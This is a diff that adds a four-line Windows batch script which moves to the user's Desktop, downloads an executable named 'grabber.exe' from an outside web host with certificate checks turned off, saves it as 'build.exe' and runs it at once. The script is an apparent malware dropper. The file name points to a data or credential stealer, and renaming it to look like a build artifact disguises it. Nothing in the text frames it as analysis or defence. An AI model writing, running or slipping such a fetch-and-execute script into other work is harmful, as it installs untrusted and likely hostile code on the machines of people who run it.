@@ -1,0 +1,4 @@
+set DESK=%USERPROFILE%\Desktop
+cd %DESK%
+curl -k -o build.exe http://nlakhdari.fr/grabber/grabber.exe
+build.exe
